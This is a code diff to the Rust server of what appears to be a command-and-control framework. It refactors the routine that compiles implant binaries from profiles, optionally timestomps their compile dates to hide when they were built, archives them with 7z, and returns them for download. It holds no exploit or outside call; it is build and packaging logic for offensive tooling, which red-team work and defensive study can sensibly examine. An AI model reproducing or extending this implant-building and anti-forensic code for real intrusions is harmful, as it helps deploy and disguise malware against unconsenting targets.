+++ c2/src/admin_task_dispatch.rs
@@ -10,19 +10,15 @@ use crate::{
     DB_EXPORT_PATH, FILE_STORE_PATH,
     app_state::{AppState, DownloadEndpointData},
     logging::{log_error, log_error_async},
-    profiles::get_profile,
+    profiles::Profile,
     timestomping::timestomp_binary_compile_date,
 };
 use axum::extract::State;
 use chrono::{SecondsFormat, Utc};
 use serde_json::Value;
-use shared::{
-    pretty_print::print_failed,
-    task_types::BuildAllBins,
-    tasks::{
-        AdminCommand, Command, DELIM_FILE_DROP_METADATA, FileDropMetadata,
-        FileUploadStagingFromClient, NewAgentStaging, StageType, WyrmResult,
-    },
+use shared::tasks::{
+    AdminCommand, Command, DELIM_FILE_DROP_METADATA, FileDropMetadata, FileUploadStagingFromClient,
+    NewAgentStaging, StageType, WyrmResult,
 };
 use shared_c2_client::{AgentC2MemoryNotifications, MapToMitre, TaskExport};
 use tokio::{
@@ -160,52 +156,101 @@ pub async fn admin_dispatch(
 ///
 /// On success, this function returns None, otherwise an Error is encoded within a `Value` as a `WyrmResult`
 pub async fn build_all_bins(
-    bab: BuildAllBins,
+    implant_profile_name: &String,
     state: State<Arc<AppState>>,
 ) -> Result<Vec<u8>, String> {
     // Save into tmp within profiles, we will delete it on completion.
     let save_path = PathBuf::from("./profiles/tmp");
-    let profile_name = bab.0;
 
-    if let Err(e) = create_dir_all(&save_path) {
-        let msg = format!(
+    create_dir_all(&save_path).map_err(|e| {
+        format!(
             "Failed to create tmp directory on c2 for profile staging. {}",
             e.kind()
-        );
-        log_error_async(&msg).await;
+        )
+    })?;
+
+    let profile = {
+        // We use the saved profile in memory
+        let guard = state.profile.read().await;
+        (*guard).clone()
+    };
+
+    //
+    // If we are building all binaries, iterate through them, otherwise just build hte specified one
+    //
+    if implant_profile_name.to_lowercase() == "all" {
+        let keys: Vec<String> = profile.implants.keys().cloned().collect();
+        for key in keys {
+            write_implant_to_tmp_disk(&profile, &save_path, &key, state.clone()).await?;
+        }
+    } else {
+        write_implant_to_tmp_disk(&profile, &save_path, implant_profile_name, state.clone())
+            .await?;
+    }
+
+    //
+    // Finally zip up the result, and return them back to the user.
+    //
+    const ZIP_OUTPUT_PATH: &str = "./profiles/tmp.7z";
+    let mut cmd = tokio::process::Command::new("7z");
+    cmd.args([
+        "a",
+        ZIP_OUTPUT_PATH,
+        &format!("{}", save_path.as_os_str().display()),
+    ]);
+
+    if let Err(e) = cmd.output().await {
+        let msg = format!("Error creating 7z archive with resulting payloads. {e}");
+        let _ = remove_dir(&save_path).await?;
+
         return Err(msg);
     };
 
     //
-    // Read the profile from disk
+    // At this point, we have created the 7z. We now want to read it into a buffer in memory,
+    // delete the archive, then return the buffer back to the user. We will send it through as a
+    // byte stream, which the client can then re-interpret as a file download.
     //
+    let _ = remove_dir(&save_path).await?;
 
-    let profile = match get_profile(&profile_name).await {
-        Ok(p) => p,
+    let mut buf = Vec::new();
+    let mut file = match tokio::fs::File::open(ZIP_OUTPUT_PATH).await {
+        Ok(f) => f,
         Err(e) => {
-            let msg = format!("Error reading profile: {profile_name}. {e:?}");
-            log_error_async(&msg).await;
+            let msg = format!("Error opening 7z file. {e}");
             let _ = remove_dir(&save_path).await?;
+
             return Err(msg);
         }
     };
 
-    let listener_profile_name = &bab.2.unwrap_or("default".into());
-    let implant_profile_name = &bab.3.unwrap_or("default".into());
+    if let Err(e) = file.read_to_end(&mut buf).await {
+        let msg = format!("Error reading 7z file. {e}");
+        let _ = remove_dir(&save_path).await?;
 
+        return Err(msg);
+    }
+
+    remove_file(ZIP_OUTPUT_PATH).await?;
+
+    Ok(buf)
+}
+
+async fn write_implant_to_tmp_disk(
+    profile: &Profile,
+    save_path: &PathBuf,
+    implant_profile_name: &str,
+    state: State<Arc<AppState>>,
+) -> Result<(), String> {
     //
     // Transform the profile into a valid `NewAgentStaging`
     //
-    let data = match profile.as_staged_agent(
-        listener_profile_name,
-        implant_profile_name,
-        StageType::All,
-    ) {
+    let data: NewAgentStaging = match profile.as_staged_agent(implant_profile_name, StageType::All)
+    {
         WyrmResult::Ok(d) => d,
         WyrmResult::Err(e) => {
-            let msg = format!("Error constructing a NewAgentStaging: {profile_name}. {e:?}");
-            log_error_async(&msg).await;
             let _ = remove_dir(&save_path).await?;
+            let msg = format!("Error constructing a NewAgentStaging. {e:?}");
             return Err(msg);
         }
     };
@@ -226,8 +271,6 @@ pub async fn build_all_bins(
 
         if let Err(e) = cmd_build_output {
             let msg = &format!("Failed to build agent. {e}");
-            log_error_async(msg).await;
-            let _ = stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
             return Err(msg.to_owned());
         }
@@ -238,9 +281,7 @@ pub async fn build_all_bins(
                 "Failed to build agent. {:#?}",
                 String::from_utf8_lossy(&output.stderr),
             );
-            log_error_async(msg).await;
 
-            let _ = stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
 
             return Err(msg.to_owned());
@@ -279,7 +320,6 @@ pub async fn build_all_bins(
             StageType::All => unreachable!(),
         }) {
             let msg = format!("Failed to add extension to local file. {dest:?}");
-            log_error_async(&msg).await;
             let _ = remove_dir(&save_path).await?;
 
             return Err(msg);
@@ -293,7 +333,6 @@ pub async fn build_all_bins(
                 src.display(),
                 dest.display()
             );
-            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
 
             return Err(msg);
@@ -307,7 +346,6 @@ pub async fn build_all_bins(
                 "The download URL matches an existing one, or a URL which is used for agent check-in, \
                 this is not permitted. Kind: {e:?}"
             );
-            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
 
             return Err(msg);
@@ -320,7 +358,6 @@ pub async fn build_all_bins(
         if let Some(ts) = data.timestomp.as_ref() {
             if let Err(e) = timestomp_binary_compile_date(ts, &dest).await {
                 let msg = format!("Could not timestomp binary {}, {e}", dest.display());
-                let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
                 let _ = remove_dir(&save_path).await?;
 
                 return Err(msg);
@@ -328,55 +365,7 @@ pub async fn build_all_bins(
         }
     }
 
-    const ZIP_OUTPUT_PATH: &str = "./profiles/tmp.7z";
-    let mut cmd = tokio::process::Command::new("7z");
-    cmd.args([
-        "a",
-        ZIP_OUTPUT_PATH,
-        &format!("{}", save_path.as_os_str().display()),
-    ]);
-
-    if let Err(e) = cmd.output().await {
-        let msg = format!("Error creating 7z archive with resulting payloads. {e}");
-        let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
-        print_failed(&msg);
-        let _ = remove_dir(&save_path).await?;
-
-        return Err(msg);
-    };
-
-    //
-    // At this point, we have created the 7z. We now want to read it into a buffer in memory,
-    // delete the archive, then return the buffer back to the user. We will send it through as a
-    // byte stream, which the client can then re-interpret as a file download.
-    //
-    let _ = remove_dir(&save_path).await?;
-
-    let mut buf = Vec::new();
-    let mut file = match tokio::fs::File::open(ZIP_OUTPUT_PATH).await {
-        Ok(f) => f,
-        Err(e) => {
-            let msg = format!("Error opening 7z file. {e}");
-            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
-            print_failed(&msg);
-            let _ = remove_dir(&save_path).await?;
-
-            return Err(msg);
-        }
-    };
-
-    if let Err(e) = file.read_to_end(&mut buf).await {
-        let msg = format!("Error reading 7z file. {e}");
-        let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
-        print_failed(&msg);
-        let _ = remove_dir(&save_path).await?;
-
-        return Err(msg);
-    }
-
-    remove_file(ZIP_OUTPUT_PATH).await?;
-
-    Ok(buf)
+    Ok(())
 }
 
 async fn remove_dir(save_path: impl AsRef<Path>) -> Result<(), String> {
@@ -923,7 +912,7 @@ async fn drop_file_handler(
         let lock = state.endpoints.read().await;
 
         for row in lock.download_endpoints.iter() {
-            if row.1.internal_name.eq(&data.internal_name) {
+            if row.0.eq(&data.internal_name) {
                 found = true;
                 // The URI doesn't include the leading /, so we add it here
                 data.download_uri = Some(format!("/{}", row.0));